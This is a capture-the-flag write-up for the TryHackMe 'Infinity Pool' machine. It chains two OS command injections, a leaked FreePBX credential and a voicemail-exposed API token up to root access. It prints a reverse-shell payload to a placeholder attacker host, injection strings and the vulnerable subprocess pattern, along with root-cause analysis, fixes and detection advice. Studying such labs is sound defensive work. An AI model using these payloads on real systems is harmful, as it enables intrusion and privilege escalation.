# Infinity Pool — Command Injection to Boot2Root

**Platform:** TryHackMe
**Event:** Hacker Holidays — Day 11
**Category:** Boot2Root / Web
**Difficulty:** Medium
**Points:** 90
**Main techniques:** Command Injection · Internal Service Enumeration · Credential Discovery · Token Leakage · Privilege Escalation

**User Flag:** `THM{XXXX}`
**Root Flag:** `THM{XXXX}`

---

## Overview

The machine initially exposes a small web application designed to check whether another property is reachable.

The application accepts a hostname and passes it directly into a shell command. Because the input is not safely handled, the parameter can be abused for **OS command injection**, providing the initial foothold.

After gaining access, the important part is looking beyond the externally exposed services. Several applications are listening only on localhost.

One of those services exposes configuration information containing FreePBX credentials. Access to the telephony interface eventually reveals an automation Bearer token through voicemail metadata.

That token provides access to a root-owned automation service containing another command-injection vulnerability.

The complete chain is:

```text
Public Web Application
        ↓
Command Injection
        ↓
Shell as web
        ↓
Enumerate localhost services
        ↓
Watchtower configuration leak
        ↓
FreePBX UCP access
        ↓
Voicemail interaction
        ↓
Automation token discovered
        ↓
Root automation API
        ↓
Second command injection
        ↓
RCE as root
        ↓
Root flag
```

---

# 1. Initial Reconnaissance

A basic scan shows the externally accessible services:

```bash
nmap -sC -sV -p22,80 $IP
```

The web server exposes a `robots.txt` file:

```bash
curl -s http://$IP/robots.txt
```

Among the entries are paths such as:

```text
/internal/
/status
```

The `/status` functionality is particularly interesting.

It describes itself as a staff-facing connectivity tool used to check whether another property responds.

The form submits a `host` parameter to:

```text
/internal/netcheck
```

This makes the parameter worth testing for command injection.

---

# 2. Testing the Ping Function

The application is supposed to execute something equivalent to:

```text
ping -c 1 <host>
```

Instead of supplying a normal hostname, a shell expression can be tested:

```bash
curl -s -X POST http://$IP/internal/netcheck \
  --data-urlencode 'host=$(whoami)'
```

The response contains:

```text
ping: web: Temporary failure in name resolution
```

This is an important clue.

The output of `whoami` is being interpreted before `ping` processes the argument.

The application is therefore passing the value through a shell.

The underlying vulnerable pattern is effectively:

```python
subprocess.run(
    f"ping -c 1 {host}",
    shell=True
)
```

The problem is not `ping` itself.

The problem is that untrusted input is being inserted into a command string executed by a shell.

---

# 3. Obtaining the Initial Shell

A reverse shell can be delivered through command substitution.

To make the payload easier to transport through the HTTP parameter, it can be Base64 encoded first:

```bash
PAYLOAD='bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'
B64=$(echo -n "$PAYLOAD" | base64 -w0)
```

Start a listener:

```bash
nc -lvnp 4444
```

Then send the command through the vulnerable parameter:

```bash
curl -s -X POST http://$IP/internal/netcheck \
  --data-urlencode "host=\$(echo $B64 | base64 -d | bash)"
```

A connection is received from the target.

The shell is running as:

```text
web
```

The user flag is located at:

```text
/home/web/user.txt
```

Reading it gives:

```text
THM{XXXX}
```

---

# 4. Looking Beyond the Public Services

The external scan only showed a couple of accessible ports.

Once inside the machine, however, the local network picture is different.

Check listening TCP sockets:

```bash
ss -tlnp
```

Several services are bound to localhost:

```text
3306   MySQL
3000   watchtower
8080   FreePBX / Apache
8088   Asterisk HTTP
9000   automation
5038   Asterisk AMI
```

This is a major discovery.

The machine is running multiple applications that are invisible from the outside.

Process ownership is also important:

```bash
ps aux
```

The services belong to different users.

In particular:

```text
edge        → web
watchtower  → svc-watch
automation  → root
```

The root-owned automation service immediately stands out as a potential privilege-escalation target.

---

# 5. Investigating Watchtower

The `watchtower` application is listening on:

```text
127.0.0.1:3000
```

An API endpoint is available at:

```text
/api/config
```

Querying it from the compromised host reveals configuration information:

```bash
curl -s http://127.0.0.1:3000/api/config
```

The response contains values similar to:

```json
{
  "automation_endpoint": "http://127.0.0.1:9000",
  "telephony_portal": "http://127.0.0.1:8080/ucp",
  "telephony_user": "FreePBXUCPTemplateCreator",
  "telephony_pass": "<redacted>",
  "ops_note": "UCP still on default template creds -- ROTATE."
}
```

This gives us two useful pieces of information:

1. The location of the automation service.
2. Credentials for the FreePBX UCP interface.

The second one provides the next step.

---

# 6. Accessing FreePBX UCP

The telephony portal is available locally through:

```text
http://127.0.0.1:8080/ucp
```

The discovered account is:

```text
FreePBXUCPTemplateCreator
```

The challenge associates this with **CVE-2026-46376**, involving a hard-coded credential used by an optional FreePBX UCP template setup feature.

The important lesson is that obtaining these credentials does not immediately provide root access.

Instead, it provides access to the telephony functionality available to that account.

---

# 7. Exploring the Voicemail Function

Inside UCP, the voicemail functionality becomes useful.

After creating/registering a test voicemail extension, an automated call eventually arrives in the mailbox.

The interesting information isn't necessarily contained in the audio itself.

Instead, the voicemail entry exposes caller information similar to:

```text
Automation Key cc_auto_XXXXXXXXXXXX <9000>
```

The value beginning with:

```text
cc_auto_
```

is an API Bearer token.

This is the key discovery required to continue toward the root service.

---

# 8. Accessing the Automation Service

The automation service is running locally on:

```text
127.0.0.1:9000
```

The discovered token can be supplied using an Authorization header.

For example:

```bash
curl -sS -X POST http://127.0.0.1:9000/jobs/export \
  -H 'Authorization: Bearer <TOKEN>' \
  -H 'Content-Type: application/json' \
  --data-binary '{"report":"latest"}'
```

The endpoint responds with information about the command it executed.

A normal request produces a command resembling:

```text
tar czf /var/automation/exports/latest.tgz /var/automation/data
```

The important question is how the `report` parameter reaches this command.

---

# 9. Discovering the Second Injection

The service constructs a shell command using the supplied `report` value.

Conceptually, it behaves like:

```text
tar ... <report> ...
```

without properly separating the user-controlled value from the shell command.

That means the same vulnerability class encountered on the public-facing application appears again.

The difference is significant:

```text
Edge application
    ↓
runs as web

Automation service
    ↓
runs as root
```

The first injection gave us a foothold.

The second injection gives us privilege escalation.

---

# 10. Executing a Root Command

A command separator can terminate the intended command and introduce another command.

For example:

```text
latest;cat /root/root.txt;#
```

The request becomes:

```bash
curl -sS -X POST http://127.0.0.1:9000/jobs/export \
  -H 'Authorization: Bearer <TOKEN>' \
  -H 'Content-Type: application/json' \
  --data-binary '{"report":"latest;cat /root/root.txt;#"}'
```

The injected command is executed by the automation service.

Because that process is running as root, the `cat` command also executes with root privileges.

The returned output contains:

```text
THM{XXXX}
```

The original `tar` command may subsequently produce an error because the injected syntax has altered it.

That error is irrelevant—the root command has already executed.

---

# 11. Why the Attack Works

There are two separate command-injection vulnerabilities in this machine.

### First injection

```text
User-controlled host
        ↓
Shell command
        ↓
Command injection
        ↓
web shell
```

### Second injection

```text
User-controlled report
        ↓
Root-owned shell command
        ↓
Command injection
        ↓
Root command execution
```

The vulnerability class is identical, but the impact is different because the affected processes run with different privileges.

---

# 12. Complete Attack Path

```text
             INTERNET
                 │
                 ▼
       ┌──────────────────┐
       │ Connectivity Tool│
       └────────┬─────────┘
                │
                ▼
       Command Injection
                │
                ▼
          Shell as web
                │
                ▼
       ┌──────────────────┐
       │ Local Enumeration│
       └────────┬─────────┘
                │
       ┌────────┴─────────┐
       ▼                  ▼
  Watchtower           FreePBX
       │                  │
       │ Config leak      │
       └───────┬──────────┘
               ▼
       UCP Credentials
               │
               ▼
          Voicemail
               │
               ▼
       Automation Token
               │
               ▼
       ┌──────────────────┐
       │ Automation :9000 │
       │      ROOT        │
       └────────┬─────────┘
                │
                ▼
       Second Command
          Injection
                │
                ▼
             ROOT
                │
                ▼
          THM{XXXX}
```

---

# Root Cause Analysis

## 1. Unsafe shell execution

The edge application directly inserts the `host` parameter into a shell command.

The dangerous pattern is:

```python
subprocess.run(
    f"ping -c 1 {host}",
    shell=True
)
```

The automation application repeats the same design mistake when constructing its `tar` command.

---

## 2. Hard-coded credentials

The UCP template functionality relies on a static credential.

Leaving that credential active after deployment creates an authentication weakness.

Credentials generated during setup should always be rotated or replaced.

---

## 3. Secret stored in user-visible metadata

The automation token appears in Caller ID information.

Caller-facing metadata should never be used as a secret storage mechanism.

If a value grants API access, it should be treated like a password or key.

---

## 4. Excessive privileges

The automation service runs as root.

Therefore, a command-injection flaw in that service immediately becomes a full root compromise.

A dedicated low-privilege service account would significantly reduce the impact.

---

# Defensive Recommendations

### Avoid shell invocation

Instead of:

```python
subprocess.run(
    f"ping -c 1 {host}",
    shell=True
)
```

use an argument list:

```python
subprocess.run(
    ["ping", "-c", "1", host],
    shell=False
)
```

This prevents shell metacharacters from being interpreted.

The same principle should be applied to the automation service.

---

### Remove default credentials

Setup accounts should:

* use randomly generated credentials,
* require password changes,
* disable unused accounts,
* and be audited after installation.

---

### Protect internal APIs

Listening on `127.0.0.1` is not a replacement for authentication.

A compromised local process should not automatically receive trusted access to every internal service.

---

### Keep secrets out of display fields

API keys should never appear in:

```text
Caller ID
Voicemail metadata
Profile fields
Contact names
Logs visible to users
```

Use a dedicated secret-management mechanism instead.

---

### Do not run automation as root

The automation service should use a dedicated account with only the permissions it needs.

For example:

```text
automation → automation-user
```

rather than:

```text
automation → root
```

---

# Detection Opportunities

Several behaviors would be useful for defenders to monitor.

### Unexpected shell processes

A web process launching:

```text
bash
sh
```

instead of the expected `ping` binary is suspicious.

---

### Reverse-shell connections

An outbound connection from the web service shortly after a request to the connectivity endpoint could indicate command injection.

---

### Internal service access

Monitor processes that unexpectedly communicate with:

```text
3000
8080
9000
5038
```

especially after a web application compromise.

---

### Token-shaped data in telephony metadata

Scanning voicemail and Caller ID fields for API-key-like values could identify accidental secret exposure.

---

### Root-owned service spawning shells

A root automation process spawning `bash`, `sh`, or other unexpected interpreters should be treated as a high-severity event.

---

# Useful Commands

### Initial reconnaissance

```bash
nmap -sC -sV -p22,80 $IP
curl -s http://$IP/robots.txt
```

### Test the first injection

```bash
curl -s -X POST http://$IP/internal/netcheck \
  --data-urlencode 'host=$(whoami)'
```

### Start a listener

```bash
nc -lvnp 4444
```

### Inspect local services

```bash
ss -tlnp
ps aux
```

### Query Watchtower

```bash
curl -s http://127.0.0.1:3000/api/config
```

### Access the automation API

```bash
curl -sS -X POST http://127.0.0.1:9000/jobs/export \
  -H 'Authorization: Bearer <TOKEN>' \
  -H 'Content-Type: application/json' \
  --data-binary '{"report":"latest"}'
```

---

# Key Takeaways

### 1. Look for repeated vulnerability patterns

The first command injection is more than just a foothold.

Once you recognize that an application is constructing shell commands unsafely, similar code should become a priority during enumeration.

In this challenge, the same fundamental mistake appears again in the root automation service.

---

### 2. Localhost does not mean safe

A service bound to:

```text
127.0.0.1
```

is inaccessible from the outside, but it may become completely reachable after obtaining a shell on the machine.

Internal services should still enforce proper authentication and authorization.

---

### 3. Secrets can appear in unexpected places

The automation token was not found in a traditional configuration file.

It was surfaced through voicemail Caller ID information.

When investigating an application, examine what the application actually displays—not just what its source code or configuration files contain.

---

### 4. Privilege matters

The first command injection resulted in:

```text
web
```

The second occurred inside a process running as:

```text
root
```

The vulnerability was essentially the same.

The difference in privileges determined the final impact.

---

## Final Summary

The machine demonstrates how several individually small weaknesses can combine into a complete compromise:

```text
Weak input validation
        +
Unsafe shell execution
        +
Exposed internal services
        +
Default credentials
        +
Leaked API token
        +
Root-owned automation
        =
Boot2Root
```

The most important lesson is to follow the trust boundaries.

A public web application led to a low-privilege shell. That shell exposed internal services, one internal service revealed credentials, the telephony application revealed another secret, and that secret finally opened access to a root-level command injection.

**The same bug class appeared twice—but only the second instance reached root.**

**User Flag:** `THM{XXXX}`
**Root Flag:** `THM{XXXX}`

*All testing described above was performed against the intentionally vulnerable TryHackMe challenge environment.*
